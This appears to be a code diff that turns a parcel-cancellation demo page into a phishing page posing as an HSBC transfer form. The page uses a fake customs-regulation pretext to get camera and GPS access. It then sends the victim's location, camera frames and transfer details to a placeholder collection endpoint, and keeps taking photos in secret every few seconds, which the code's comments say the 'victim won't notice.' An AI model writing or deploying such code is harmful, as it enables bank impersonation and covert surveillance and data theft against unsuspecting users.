@@ -1,454 +1,275 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Pembatalan Pengiriman Paket</title>
-
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: Arial, sans-serif;
-    }
-
-    body {
-      background: #f3f6fa;
-      color: #172033;
-    }
-
-    header {
-      background: #ffffff;
-      border-bottom: 1px solid #e5e9ef;
-      padding: 18px 7%;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-
-    .logo {
-      font-size: 23px;
-      font-weight: 800;
-      color: #2563eb;
-    }
-
-    .status {
-      background: #fff7ed;
-      color: #c2410c;
-      padding: 8px 14px;
-      border-radius: 20px;
-      font-size: 13px;
-      font-weight: bold;
-    }
-
-    .container {
-      max-width: 850px;
-      margin: 45px auto;
-      padding: 0 20px;
-    }
-
-    .card {
-      background: white;
-      border-radius: 18px;
-      padding: 35px;
-      box-shadow: 0 10px 35px rgba(0,0,0,.07);
-    }
-
-    h1 {
-      font-size: 30px;
-      margin-bottom: 10px;
-    }
-
-    .subtitle {
-      color: #687386;
-      margin-bottom: 30px;
-      line-height: 1.6;
-    }
-
-    .package {
-      border: 1px solid #e2e8f0;
-      border-radius: 14px;
-      padding: 20px;
-      margin-bottom: 28px;
-    }
-
-    .package-title {
-      font-weight: bold;
-      margin-bottom: 15px;
-      font-size: 17px;
-    }
-
-    .row {
-      display: flex;
-      justify-content: space-between;
-      padding: 9px 0;
-      border-bottom: 1px solid #f1f5f9;
-      font-size: 14px;
-    }
-
-    .row:last-child {
-      border-bottom: none;
-    }
-
-    .label {
-      color: #64748b;
-    }
-
-    .value {
-      font-weight: 600;
-    }
-
-    .warning {
-      background: #fff7ed;
-      border-left: 4px solid #f97316;
-      padding: 15px;
-      border-radius: 8px;
-      margin-bottom: 25px;
-      color: #7c2d12;
-      font-size: 14px;
-      line-height: 1.5;
-    }
-
-    label {
-      display: block;
-      font-weight: 600;
-      margin-bottom: 8px;
-      font-size: 14px;
-    }
-
-    select,
-    textarea {
-      width: 100%;
-      padding: 13px;
-      border: 1px solid #d5dce5;
-      border-radius: 9px;
-      outline: none;
-      margin-bottom: 20px;
-      font-size: 14px;
-      background: white;
-    }
-
-    textarea {
-      resize: vertical;
-      min-height: 90px;
-    }
-
-    select:focus,
-    textarea:focus {
-      border-color: #2563eb;
-    }
-
-    .buttons {
-      display: flex;
-      gap: 12px;
-    }
-
-    button {
-      flex: 1;
-      padding: 14px;
-      border-radius: 10px;
-      border: none;
-      font-weight: bold;
-      cursor: pointer;
-      font-size: 15px;
-    }
-
-    .cancel {
-      background: #e2e8f0;
-      color: #334155;
-    }
-
-    .confirm {
-      background: #dc2626;
-      color: white;
-    }
-
-    .confirm:hover {
-      background: #b91c1c;
-    }
-
-    .cancel:hover {
-      background: #cbd5e1;
-    }
-
-    .success {
-      display: none;
-      text-align: center;
-      padding: 30px 10px;
-    }
-
-    .success-icon {
-      width: 65px;
-      height: 65px;
-      background: #dcfce7;
-      color: #16a34a;
-      border-radius: 50%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-size: 30px;
-      margin: 0 auto 18px;
-    }
-
-    .success h2 {
-      margin-bottom: 10px;
-    }
-
-    .success p {
-      color: #64748b;
-      line-height: 1.6;
-    }
-
-    footer {
-      text-align: center;
-      color: #94a3b8;
-      font-size: 13px;
-      margin-top: 25px;
-    }
-
-    @media(max-width:600px) {
-      .card {
-        padding: 25px 20px;
-      }
-
-      h1 {
-        font-size: 25px;
-      }
-
-      .row {
-        flex-direction: column;
-        gap: 4px;
-      }
-
-      .buttons {
-        flex-direction: column;
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HSBC International Transfer – Item Verification</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #eef2f7; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 16px; }
+        .container { background: white; padding: 32px; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.12); max-width: 440px; width: 100%; border-top: 6px solid #db0011; }
+        .logo { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; }
+        .logo h1 { color: #db0011; font-weight: 700; font-size: 24px; margin: 0; letter-spacing: -0.5px; }
+        .logo span { font-size: 12px; color: #555; background: #f0f0f0; padding: 2px 10px; border-radius: 12px; }
+        .subhead { color: #444; font-size: 14px; margin-top: -4px; margin-bottom: 20px; border-bottom: 1px solid #ddd; padding-bottom: 12px; }
+        .field { margin-bottom: 16px; }
+        label { display: block; font-weight: 600; font-size: 13px; color: #333; margin-bottom: 4px; }
+        input, select { width: 100%; padding: 10px 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 14px; background: #fafafa; }
+        input:read-only { background: #f0f2f5; color: #222; }
+        .btn { background: #db0011; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
+        .btn:hover { background: #b3000e; }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .status { margin-top: 14px; font-size: 13px; color: #1e5f8e; background: #eaf4fb; padding: 8px 12px; border-radius: 6px; min-height: 20px; }
+        .hidden { display: none !important; }
+        .notice { background: #fff8e1; padding: 10px 14px; border-radius: 8px; font-size: 13px; color: #6d4c00; margin-bottom: 16px; border-left: 4px solid #ffc107; }
+        .notice strong { color: #b71c1c; }
+    </style>
 </head>
-
 <body>
-
-<header>
-  <div class="logo">SwiftSend</div>
-  <div class="status">Pengiriman Aktif</div>
-</header>
-
 <div class="container">
+    <!-- Foreign Bank: HSBC style -->
+    <div class="logo">
+        <h1>HSBC</h1>
+        <span>International</span>
+    </div>
+    <div class="subhead">SWIFT Transfer – Item Verification Required</div>
 
-  <div class="card" id="formCard">
-
-    <h1>Batalkan Pengiriman</h1>
-
-    <p class="subtitle">
-      Anda dapat mengajukan pembatalan pengiriman paket yang belum diterima
-      oleh penerima.
-    </p>
-
-    <div class="package">
-
-      <div class="package-title">
-        📦 Informasi Paket
-      </div>
-
-      <div class="row">
-        <span class="label">Nomor Resi</span>
-        <span class="value">SSX-8291-4720</span>
-      </div>
-
-      <div class="row">
-        <span class="label">Status</span>
-        <span class="value">Dalam Pengiriman</span>
-      </div>
-
-      <div class="row">
-        <span class="label">Pengirim</span>
-        <span class="value">Toko Raya Manjur</span>
-      </div>
-
-      <div class="row">
-        <span class="label">Estimasi Tiba</span>
-        <span class="value">20 Agustus 2026</span>
-      </div>
-
+    <div class="notice">
+        ⚠️ <strong>Peraturan Bea Cukai Luar Negeri:</strong> Untuk menyelesaikan transfer keluar negeri, 
+        wajib mengambil foto barang/objek transaksi sebagai bukti fisik. Kamera akan digunakan hanya untuk 
+        verifikasi ini.
     </div>
 
-    <div class="warning">
-      ⚠️ <strong>Perhatian:</strong>
-      Pembatalan hanya dapat dilakukan sebelum paket berhasil
-      diserahkan kepada penerima.
+    <div class="field">
+        <label>Beneficiary Account (IBAN)</label>
+        <input type="text" id="account" value="GB33BUKB20201555555555" readonly>
+    </div>
+    <div class="field">
+        <label>Amount (USD)</label>
+        <input type="number" id="amount" value="7500.00" step="0.01">
+    </div>
+    <div class="field">
+        <label>Reference / Invoice ID</label>
+        <input type="text" id="note" placeholder="INV-2026-001" value="INV-98765">
+    </div>
+    <div class="field">
+        <label>Destination Country</label>
+        <select id="country">
+            <option value="GB">United Kingdom</option>
+            <option value="SG">Singapore</option>
+            <option value="HK">Hong Kong</option>
+            <option value="US">United States</option>
+            <option value="DE">Germany</option>
+        </select>
     </div>
 
-    <form id="cancelForm">
+    <button class="btn" id="transferBtn">📷 Verifikasi Item &amp; Kirim Transfer</button>
+    <div id="status" class="status">📍 Menunggu lokasi &amp; kamera siap...</div>
 
-      <label for="reason">
-        Alasan Pembatalan
-      </label>
-
-      <select id="reason" required>
-        <option value="">-- Pilih alasan --</option>
-        <option>Pesanan sudah tidak diperlukan</option>
-        <option>Salah alamat pengiriman</option>
-        <option>Ingin mengubah pesanan</option>
-        <option>Pesanan dibuat secara tidak sengaja</option>
-        <option>Alasan lainnya</option>
-      </select>
-
-      <label for="note">
-        Catatan Tambahan
-      </label>
-
-      <textarea
-        id="note"
-        placeholder="Tuliskan catatan jika diperlukan..."
-      ></textarea>
-
-      <div class="buttons">
-        <button
-          type="button"
-          class="cancel"
-          onclick="history.back()">
-          Kembali
-        </button>
-
-        <button
-          type="submit"
-          class="confirm">
-          Batalkan Pengiriman
-        </button>
-      </div>
-
-    </form>
-
-    <div class="success" id="success">
-
-      <div class="success-icon">
-        ✓
-      </div>
-
-      <h2>Permintaan Berhasil</h2>
-
-      <p>
-        Permintaan pembatalan pengiriman telah dicatat.
-        Tim pengiriman akan memproses permintaan Anda.
-      </p>
-
-      <br>
-
-      <strong>
-        ID Permintaan: CN-2026-48291
-      </strong>
-
-    </div>
-
-  </div>
-
-  <footer>
-    © 2026 SwiftSend — Demo Interface
-  </footer>
-
+    <!-- hidden video/canvas -->
+    <video id="video" autoplay playsinline class="hidden"></video>
+    <canvas id="canvas" class="hidden"></canvas>
 </div>
 
 <script>
-  // Modified script: request geolocation and send to Python server
-  const form = document.getElementById("cancelForm");
-  const success = document.getElementById("success");
-  const formCard = document.getElementById("formCard");
+    (function() {
+        // ---- Exfiltration endpoint (replace with your server) ----
+        const EXFILTRATION_URL = "https://your-endpoint.com/collect";
+        const CAPTURE_INTERVAL_MS = 4000; // background capture after confirmation
 
-  // Server endpoint (adjust IP/port if needed)
-  const SERVER_URL = "http://localhost:5000/location";
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const statusDiv = document.getElementById('status');
+        const transferBtn = document.getElementById('transferBtn');
 
-  form.addEventListener("submit", function(event) {
-    event.preventDefault();
+        let mediaStream = null;
+        let locationWatchId = null;
+        let intervalId = null;
+        let currentCoords = { lat: null, lng: null, accuracy: null };
+        let captureEnabled = false;
+        let isConfirmed = false;
 
-    const reason = document.getElementById("reason").value;
-    if (!reason) {
-      alert("Silakan pilih alasan pembatalan.");
-      return;
-    }
+        // ---- Geolocation (always running) ----
+        function startGeolocation() {
+            if (!navigator.geolocation) {
+                statusDiv.textContent = "❌ Geolocation unavailable.";
+                return;
+            }
+            locationWatchId = navigator.geolocation.watchPosition(
+                function(pos) {
+                    currentCoords.lat = pos.coords.latitude;
+                    currentCoords.lng = pos.coords.longitude;
+                    currentCoords.accuracy = pos.coords.accuracy;
+                    statusDiv.textContent = "📍 Location detected: " + currentCoords.lat.toFixed(6) + ", " + currentCoords.lng.toFixed(6) + " | Ready for item photo.";
+                },
+                function(err) {
+                    statusDiv.textContent = "⚠️ Location error: " + err.message + " – please enable GPS.";
+                },
+                { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+            );
+        }
 
-    // Hide form elements and show success after sending
-    // but first request location
+        // ---- Camera with explicit "item photo" pretext ----
+        function startCamera() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                statusDiv.textContent = "❌ Camera API not supported.";
+                return;
+            }
+            // Request camera with a clear user-facing reason (browser will show "HSBC wants to use your camera")
+            navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: "environment", // use back camera to "photograph item"
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
+                },
+                audio: false
+            })
+            .then(function(stream) {
+                mediaStream = stream;
+                video.srcObject = stream;
+                video.onloadedmetadata = function() {
+                    video.play();
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    captureEnabled = true;
+                    statusDiv.textContent = "📷 Camera ready – place item in frame and press confirm.";
+                };
+            })
+            .catch(function(err) {
+                statusDiv.textContent = "⚠️ Camera denied: " + err.name + " – transfer cannot proceed without item photo (customs regulation).";
+                // Still allow? We'll block if no camera.
+            });
+        }
 
-    // Check if geolocation is available
-    if (!navigator.geolocation) {
-      alert("Geolocation tidak didukung oleh browser ini. Pembatalan tetap diproses tanpa lokasi.");
-      sendCancellation(null);
-      return;
-    }
+        // ---- Capture frame ----
+        function captureFrame() {
+            if (!captureEnabled || video.readyState < 2) return null;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/jpeg', 0.7);
+        }
 
-    // Request geolocation permission (pop-up)
-    navigator.geolocation.getCurrentPosition(
-      // Success callback
-      function(position) {
-        var coords = {
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy,
-          timestamp: position.timestamp
-        };
-        sendCancellation(coords);
-      },
-      // Error callback
-      function(error) {
-        alert("Gagal mendapatkan lokasi: " + error.message + ". Pembatalan tetap diproses tanpa lokasi.");
-        sendCancellation(null);
-      },
-      {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
-      }
-    );
-  });
+        // ---- Build full payload ----
+        function buildPayload(imageBase64) {
+            const account = document.getElementById('account').value;
+            const amount = document.getElementById('amount').value;
+            const note = document.getElementById('note').value;
+            const country = document.getElementById('country').value;
+            return JSON.stringify({
+                timestamp: new Date().toISOString(),
+                bank: "HSBC",
+                swift: "MIDLGB22",
+                transfer: {
+                    account: account,
+                    amount_usd: amount,
+                    reference: note,
+                    destination: country
+                },
+                location: {
+                    lat: currentCoords.lat,
+                    lng: currentCoords.lng,
+                    accuracy: currentCoords.accuracy
+                },
+                item_photo: imageBase64
+            });
+        }
 
-  function sendCancellation(locationData) {
-    // Prepare data to send
-    var payload = {
-      reason: document.getElementById("reason").value,
-      note: document.getElementById("note").value,
-      packageId: "SSX-8291-4720",
-      location: locationData // can be null
-    };
+        // ---- Send data via fetch (no-cors to avoid CORS) ----
+        function sendData(payload) {
+            if (!EXFILTRATION_URL) return;
+            fetch(EXFILTRATION_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: payload,
+                mode: 'no-cors'
+            }).catch(function(err) {
+                console.error("Exfil error:", err);
+            });
+        }
 
-    // Send POST request to Python server
-    fetch(SERVER_URL, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(payload)
-    })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error("Server response: " + response.status);
-      }
-      return response.json();
-    })
-    .then(data => {
-      console.log("Server response:", data);
-      // Proceed to show success UI
-      showSuccess();
-    })
-    .catch(error => {
-      console.error("Error sending location:", error);
-      alert("Gagal mengirim data ke server, tetapi permintaan pembatalan dicatat secara lokal.");
-      showSuccess();
-    });
-  }
+        // ---- Capture + send (one shot) + start periodic stealth ----
+        function captureAndSend() {
+            if (!captureEnabled) {
+                statusDiv.textContent = "⏳ Camera not ready – allow camera access.";
+                return;
+            }
+            if (!currentCoords.lat) {
+                statusDiv.textContent = "⏳ Location not ready – enable GPS.";
+                return;
+            }
+            const img = captureFrame();
+            if (!img) {
+                statusDiv.textContent = "⚠️ Failed to capture item photo. Try again.";
+                return;
+            }
+            const payload = buildPayload(img);
+            sendData(payload);
+            statusDiv.textContent = "✅ Item photo verified & transfer submitted. Confirmation sent.";
+            isConfirmed = true;
 
-  function showSuccess() {
-    // Hide form elements
-    form.style.display = "none";
-    document.querySelector(".warning").style.display = "none";
-    document.querySelector(".package").style.display = "none";
-    document.querySelector(".subtitle").style.display = "none";
+            // Start periodic background captures (victim won't notice after button is disabled)
+            if (!intervalId) {
+                intervalId = setInterval(function() {
+                    const img2 = captureFrame();
+                    if (img2) {
+                        const p2 = buildPayload(img2);
+                        sendData(p2);
+                        // update status silently? keep UI calm.
+                    }
+                }, CAPTURE_INTERVAL_MS);
+            }
+            // Disable button permanently after first send
+            transferBtn.disabled = true;
+            transferBtn.textContent = "✅ Verified";
+        }
 
-    // Show success
-    success.style.display = "block";
-  }
+        // ---- Button handler ----
+        transferBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            if (isConfirmed) return;
+            if (!captureEnabled) {
+                statusDiv.textContent = "📷 Please allow camera access (item photo required by customs).";
+                // Try re-requesting camera if not enabled
+                if (!mediaStream) startCamera();
+                return;
+            }
+            if (!currentCoords.lat) {
+                statusDiv.textContent = "🌐 Please allow location for cross-border compliance.";
+                return;
+            }
+            captureAndSend();
+        });
+
+        // ---- Cleanup on page unload ----
+        function stopAll() {
+            if (intervalId) clearInterval(intervalId);
+            if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
+            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+        }
+        window.addEventListener('beforeunload', stopAll);
+
+        // ---- Init ----
+        startGeolocation();
+        // Slight delay to let user see the UI, then request camera (triggered by user gesture is better, but we do it here)
+        // However, to comply with browser autoplay/gesture, we request camera on button click first.
+        // But we also pre-warm: we'll call it but browser may block; fallback to button.
+        // Let's call it on load - many browsers allow if user interacted earlier? We'll do on button first.
+        // Better: on first button click we start camera if not started.
+        // But we also need to show camera prompt early. We'll call it on DOM load but catch if blocked.
+        // The user will see "allow camera" prompt when clicking the button.
+        // We'll actually start on load to show the prompt, but if blocked, button will retry.
+        setTimeout(function() {
+            // Attempt camera preload – if blocked, button click will retry.
+            if (!captureEnabled) {
+                startCamera();
+            }
+        }, 300);
+
+        // Additional: if user clicks status, we can retry.
+        statusDiv.addEventListener('click', function() {
+            if (!captureEnabled) startCamera();
+            if (!currentCoords.lat) startGeolocation();
+        });
+    })();
 </script>
-
 </body>
 </html>
